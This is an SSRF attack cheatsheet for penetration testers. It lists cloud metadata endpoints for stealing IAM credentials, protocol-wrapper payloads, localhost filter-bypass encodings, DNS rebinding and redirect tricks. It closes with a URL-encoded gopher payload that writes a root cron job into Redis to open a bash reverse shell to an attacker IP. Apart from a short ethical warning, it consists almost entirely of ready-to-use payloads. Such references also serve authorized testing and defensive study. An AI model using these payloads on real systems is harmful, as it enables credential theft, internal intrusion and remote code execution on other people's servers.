# 🌩️ SSRF (Server-Side Request Forgery) Cheatsheet

> **⚠️ Ethical Warning:** Research and authorized testing only. Hitting internal metadata endpoints on production cloud environments is a critical severity action.

---

## 🧠 1. The Types of SSRF

*Understanding the "visibility" you have determines your attack path.*

### A. Basic (In-Band) SSRF

**What it means:** You send a request, and the server returns the **full response** to you.

* **Impact:** Massive. You can read files, steal cloud keys, or view internal admin panels directly.
* **Detection:**
* Input: `https://www.google.com`
* Output: The actual HTML content of Google's homepage is rendered in the app.



### B. Blind SSRF

**What it means:** You send a request, but the server **does not return the response** body.

* **Impact:** Lower immediate impact, but used to map internal networks or trigger remote code execution (RCE) on internal services (e.g., Redis, Memcached).
* **Detection:**
* **Time-Based:** `http://10.0.0.1:80` (Fast response) vs `http://10.0.0.1:81` (Timeout/Slow).
* **Out-of-Band (OOB):** You force the server to DNS query or HTTP request a server you control (e.g., Burp Collaborator).



### C. Semi-Blind / Boolean SSRF

**What it means:** You don't see the body, but you get a **different status code, error message, or response length**.

* **Impact:** Port scanning and internal service enumeration.
* **Detection:**
* `http://localhost:22` -> Returns "Error: SSH-2.0..." (You know SSH is open).
* `http://localhost:80` -> Returns "200 OK" (Empty body).
* `http://localhost:9999` -> Returns "Connection Refused".



---

## ☁️ 2. Cloud Metadata Targets (The "Holy Grail")

*If you have In-Band SSRF on a cloud server, these are your first targets to steal credentials.*

### AWS (Amazon Web Services)

**IMDSv1 (Legacy - Most vulnerable)**

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

```

**IMDSv2 (Modern - Requires Header)**
*Harder to exploit via standard SSRF; requires Header Injection or specific client misconfiguration.*

* Needs header: `X-aws-ec2-metadata-token-ttl-seconds: 21600`

### Google Cloud Platform (GCP)

* **Legacy (v1beta1):** `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json`
* **Modern (v1):** Requires header `Metadata-Flavor: Google` (Defeats most basic SSRF).

### Azure

* `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
* Requires header: `Metadata: true`

### DigitalOcean & Oracle Cloud

* **DigitalOcean:** `http://169.254.169.254/metadata/v1.json`
* **Oracle:** `http://169.254.169.254/opc/v1/instance/` (Often requires `Authorization: Bearer` header).

---

## 🔗 3. Protocol Wrappers (Scheme Flooding)

*If `http://` is blocked, or you need to interact with non-web services.*

| Wrapper | Usage | Target |
| --- | --- | --- |
| **file://** | `file:///etc/passwd` | Read local files (LFI via SSRF). |
| **gopher://** | `gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall...` | Talk to Redis, SMTP, Memcached (Arbitrary TCP). |
| **dict://** | `dict://127.0.0.1:11211/stat` | Memcached interaction. |
| **sftp://** | `sftp://evil.com:1337/` | Sometimes triggers Java loading external classes. |
| **ldap://** | `ldap://localhost:389/%0astats%0aquit` | Internal LDAP info. |

---

## 🚧 4. Filter Bypasses

*Developers often block "localhost" or "127.0.0.1". Here is how to slip past.*

### A. IP Encoding (The "Transformer")

*Browsers resolve these as 127.0.0.1, but regex filters often miss them.*

| Type | Payload |
| --- | --- |
| **Decimal** | `http://2130706433` |
| **Octal** | `http://0177.0000.0000.0001` |
| **Hex** | `http://0x7f000001` |
| **Mixed** | `http://127.1` (Shorthand) |
| **Enclosed** | `http://[::1]` (IPv6) |

### B. DNS Rebinding

*The ultimate bypass for "Time-of-Check to Time-of-Use" (TOCTOU).*

1. You own `attacker.com`.
2. **Request 1 (Check):** `attacker.com` resolves to `8.8.8.8` (Safe IP). Firewall allows it.
3. **Request 2 (Fetch):** `attacker.com` changes TTL to 0 and resolves to `127.0.0.1`.
4. **Result:** Server talks to itself thinking it's talking to Google.

* *Tool:* rbndr.us (e.g., `7f000001.80808080.rbndr.us` switches between 127.0.0.1 and 8.8.8.8).

### C. Redirects (The "Boomerang")

*If the server follows redirects, host the redirect on your own server.*

1. Server requests `http://evil.com/redirect`.
2. Your server responds: `HTTP 302 Location: http://169.254.169.254/latest/meta-data/`.
3. Server follows the link and displays the keys.

---

## 🎯 5. Blind SSRF -> RCE (The "Gopher" Method)

*If you have Blind SSRF, you can't read files. But you can WRITE commands to internal services.*

**Target: Internal Redis (Port 6379)**

* Redis often has no auth on localhost.
* **Attack:** Use `gopher://` to send a constructed payload that writes a malicious cron job or SSH key to the server.

```text
gopher://127.0.0.1:6379/_%0D%0ASET%20x%20%22%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOURIP%2F4444%200%3E%261%0A%22%0D%0ACONFIG%20SET%20dir%20%2Fvar%2Fspool%2Fcron%2F%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0AQUIT

```

---

## 🛠️ 6. Quick Reference: Common Internal Ports

*If scanning `localhost`, look for these.*

* **21:** FTP
* **22:** SSH (Banner grabbing)
* **25:** SMTP (Gopher can send mail)
* **80/443/8080:** Internal Web Apps
* **3306:** MySQL
* **6379:** Redis (RCE Target)
* **8000/8443:** Common Admin Panels
* **9200:** Elasticsearch (Info Disclosure)
* **27017:** MongoDB

---
